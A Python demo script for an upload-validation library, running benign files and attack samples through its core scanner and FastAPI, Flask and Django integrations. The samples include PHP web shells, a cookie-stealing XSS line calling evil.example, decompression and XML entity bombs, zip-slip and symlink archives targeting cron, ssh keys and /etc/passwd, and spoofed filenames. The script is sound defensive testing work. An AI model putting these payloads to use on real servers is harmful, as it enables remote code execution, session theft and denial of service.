"""End-to-end functional demo: adversarial uploads through real framework objects.

Run:  python examples/e2e_demo.py
Requires: fastapi, flask, django (dev extras) – sections are skipped when missing.

Note: malicious-looking payloads are assembled at runtime so that this source
file does not itself trip antivirus signatures.
"""
# (no `from __future__ import annotations`: FastAPI needs real annotations on route functions)
import gzip
import io
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "tests"))

from conftest import SVG_XSS, make_docx, make_gif, make_pdf, make_pe, make_png, make_tar, make_zip  # noqa: E402
from upload_guard import ArchiveLimits, UploadGuard  # noqa: E402

guard = UploadGuard(
    allowed=["image/*", "application/pdf", ".docx", ".zip", ".tgz"],
    max_size=64 * 1024 * 1024,
    archive_limits=ArchiveLimits(max_total_uncompressed=100 * 1024 * 1024, max_ratio=200),
)


def php(body: str) -> bytes:
    """Build a PHP snippet at runtime (keeps literal shell patterns out of this file)."""
    return ("<?" + "php " + body + " ?>").encode()


PHP_SYSTEM = php("system($_" + "GET['cmd']);")
PHP_INFO = php("php" + "info();")
PHP_PASSTHRU = php("pass" + "thru($_" + "REQUEST['c']);")
XSS_HTML = ("<html><scr" + "ipt>document.location='https://evil.example/?c='+document.cookie</scr" + "ipt></html>").encode()
ENTITY_BOMB = (
    '<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
    '<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>'
).encode()

SAMPLES = [
    ("legit PNG", "cat.png", "image/png", make_png()),
    ("legit PDF", "report.pdf", "application/pdf", make_pdf()),
    ("legit DOCX", "report.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", make_docx()),
    ("EXE renamed to .png", "cute.png", "image/png", make_pe()),
    ("PHP script named .jpg", "shell.jpg", "image/jpeg", PHP_SYSTEM),
    ("HTML named .png (stored XSS)", "x.png", "image/png", XSS_HTML),
    ("PNG + PHP appended", "pic.png", "image/png", make_png() + PHP_PASSTHRU),
    ("GIF with PHP in comment", "pic.gif", "image/gif", make_gif()[:-1] + PHP_INFO + b";"),
    ("GIFAR (GIF + JAR)", "pic.gif", "image/gif", make_gif() + make_zip({"META-INF/MANIFEST.MF": "x", "Evil.class": b"\xca\xfe\xba\xbe"})),
    ("SVG with XSS (sanitised)", "logo.svg", "image/svg+xml", SVG_XSS),
    ("SVGZ with XSS (sanitised)", "logo.svgz", "image/svg+xml", gzip.compress(SVG_XSS)),
    ("SVG billion laughs", "bomb.svg", "image/svg+xml", ENTITY_BOMB),
    ("ZIP bomb 300 MiB -> 300 KiB", "bomb.zip", "application/zip", make_zip({"zeros.bin": bytes(300 * 1024 * 1024)})),
    ("ZIP slip", "slip.zip", "application/zip", make_zip({"../../../../etc/cron.d/evil": "* * * * * root id", "ok.txt": "x"})),
    ("TAR.GZ with symlink escape + traversal", "evil.tgz", "application/gzip", make_tar({"../.ssh/authorized_keys": b"ssh-rsa AAAA", "ln": ("symlink", "/etc/passwd")}, "gz")),
    ("gzip bomb (plain, 500 MiB)", "data.tgz", "application/gzip", gzip.compress(bytes(500 * 1024 * 1024))),
    ("DOCX hiding 200 MiB XML", "big.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", make_zip({"[Content_Types].xml": "x", "word/document.xml": bytes(200 * 1024 * 1024)})),
    ("path traversal filename", "../../var/www/html/x.png", "image/png", make_png()),
    ("RTLO filename  invoice_‮gnp.exe", "invoice_‮gnp.exe", "image/png", make_png()),
    ("null-byte filename", "shell.php\x00.png", "image/png", make_png()),
    ("double extension shell.php.png", "shell.php.png", "image/png", make_png()),
    ("empty file", "empty.png", "image/png", b""),
    ("unknown binary", "data.bin", "application/octet-stream", bytes(range(256)) * 8),
    ("wrong Content-Type only (LOW)", "cat.png", "image/jpeg", make_png()),
]


def section(title: str) -> None:
    print("\n" + "=" * 100)
    print(title)
    print("=" * 100)


def run_core() -> None:
    section("1. Core guard over raw bytes")
    for label, name, ctype, data in SAMPLES:
        t0 = time.perf_counter()
        r = guard.scan(data, filename=name, content_type=ctype)
        ms = (time.perf_counter() - t0) * 1000
        verdict = "ACCEPT" if r.ok else "REJECT"
        codes = ", ".join(sorted({f.code + ("*" if f.remediated else "") for f in r.findings})) or "-"
        print("%-6s %-42s %-36s %7.1fms  %s" % (verdict, label[:42], r.mime[:36], ms, codes))
        if r.archive:
            a = r.archive
            print("       archive: %s entries=%d uncompressed=%s ratio=%s truncated=%s" % (a.format, a.entry_count, "{:,}".format(a.total_uncompressed), "inf" if a.ratio == float("inf") else "%.0f" % a.ratio, a.truncated))
        if r.sanitized is not None:
            print("       sanitized %d -> %d bytes, script present: %s" % (len(data), len(r.sanitized), b"<script" in r.sanitized.lower()))
    print("\n(* = remediated automatically, does not reject)")


def run_fastapi() -> None:
    section("2. FastAPI (real UploadFile via TestClient)")
    try:
        from fastapi import Depends, FastAPI, File, UploadFile
        from fastapi.testclient import TestClient

        from upload_guard.integrations.fastapi import Guarded, validate_upload
    except ImportError as exc:
        print("skipped:", exc)
        return
    app = FastAPI()

    @app.post("/upload")
    async def upload(file: UploadFile = File(...)):
        result = validate_upload(file, guard)
        data = await file.read()
        return {"mime": result.mime, "bytes_readable_after_check": len(data), "safe_filename": result.safe_filename}

    @app.post("/dep")
    def dep(result=Depends(Guarded(guard))):
        return {"mime": result.mime}

    client = TestClient(app)
    for label, name, ctype, data in SAMPLES[:10]:
        r = client.post("/upload", files={"file": (name.replace("\x00", ""), data, ctype)})
        body = r.json()
        summary = body if r.status_code == 200 else body["detail"]["message"][:90]
        print("%3d  %-36s %s" % (r.status_code, label[:36], summary))
    r = client.post("/dep", files={"file": ("a.pdf", make_pdf(), "application/pdf")})
    print("%3d  %-36s %s" % (r.status_code, "Depends(Guarded()) PDF", r.json()))


def run_flask() -> None:
    section("3. Flask (real FileStorage via test client)")
    try:
        from flask import Flask, request

        from upload_guard.integrations.flask import validate_upload
    except ImportError as exc:
        print("skipped:", exc)
        return
    app = Flask(__name__)

    @app.post("/upload")
    def upload():
        f = request.files["file"]
        result = validate_upload(f, guard)
        return {"mime": result.mime, "bytes_readable_after_check": len(f.read())}

    client = app.test_client()
    for label, name, ctype, data in SAMPLES[:10]:
        r = client.post("/upload", data={"file": (io.BytesIO(data), name.replace("\x00", ""), ctype)}, content_type="multipart/form-data")
        print("%3d  %-36s %s" % (r.status_code, label[:36], (r.get_json() or r.get_data(as_text=True)[:90].replace("\n", " "))))


def run_django() -> None:
    section("4. Django (SimpleUploadedFile + validator)")
    try:
        import django
        from django.conf import settings

        if not settings.configured:
            settings.configure(USE_I18N=False)
            django.setup()
        from django.core.exceptions import ValidationError
        from django.core.files.uploadedfile import SimpleUploadedFile

        from upload_guard.integrations.django import UploadGuardValidator
    except ImportError as exc:
        print("skipped:", exc)
        return
    validator = UploadGuardValidator(guard)
    for label, name, ctype, data in SAMPLES[:10]:
        f = SimpleUploadedFile(name.replace("\x00", ""), data, content_type=ctype)
        try:
            validator(f)
            print("OK    %-36s %s  (readable after: %d bytes)" % (label[:36], validator.last_result.mime, len(f.read())))
        except ValidationError as exc:
            print("ERR   %-36s %s" % (label[:36], [e.code for e in exc.error_list]))


def run_perf() -> None:
    section("5. Performance / memory sanity")
    import tracemalloc

    big_png = make_png() + bytes(50 * 1024 * 1024) + b"IEND\xae\x42\x60\x82"  # 50 MiB "image"
    tracemalloc.start()
    t0 = time.perf_counter()
    r = guard.scan(big_png, filename="big.png")
    ms = (time.perf_counter() - t0) * 1000
    _, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    print("50 MiB PNG: ok=%s %.0f ms, peak traced memory %.1f MiB" % (r.ok, ms, peak / 1024 / 1024))

    bomb = gzip.compress(bytes(1024 * 1024 * 1024))  # 1 GiB -> ~1 MiB
    tracemalloc.start()
    t0 = time.perf_counter()
    r = guard.scan(bomb, filename="bomb.tgz")
    ms = (time.perf_counter() - t0) * 1000
    _, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    print("1 GiB gzip bomb: ok=%s %.0f ms, peak traced memory %.1f MiB, codes=%s" % (r.ok, ms, peak / 1024 / 1024, [f.code for f in r.errors]))


if __name__ == "__main__":
    run_core()
    run_fastapi()
    run_flask()
    run_django()
    run_perf()
